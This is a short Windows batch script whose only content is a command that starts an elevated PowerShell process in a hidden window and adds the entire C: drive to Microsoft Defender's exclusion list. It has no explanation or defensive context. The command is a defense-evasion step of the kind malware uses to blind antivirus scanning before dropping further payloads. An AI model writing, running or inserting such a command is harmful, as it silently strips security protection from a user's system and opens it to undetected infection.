@echo off
powershell -Command "Start-Process -FilePath 'powershell' -ArgumentList 'Add-MpPreference -ExclusionPath \"C:\"' -Verb runAs -WindowStyle Hidden"
